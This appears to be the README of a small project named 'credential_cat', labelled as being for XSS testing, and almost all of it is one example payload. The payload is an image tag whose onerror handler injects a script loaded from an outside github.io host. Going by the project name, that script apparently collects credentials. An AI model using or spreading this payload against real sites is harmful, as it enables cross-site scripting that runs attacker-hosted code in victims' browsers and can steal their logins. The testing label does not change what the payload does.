# credential_cat

# Just for XSS testig

### example payload:
> &lt;img src="jiji://a/404.png" width="1px" height="1px" onerror=" var s = document.createElement('script');s.src = 'https://astals.github.io/credential_cat/credential_cat.js' ;$('head').append(s);"&gt;
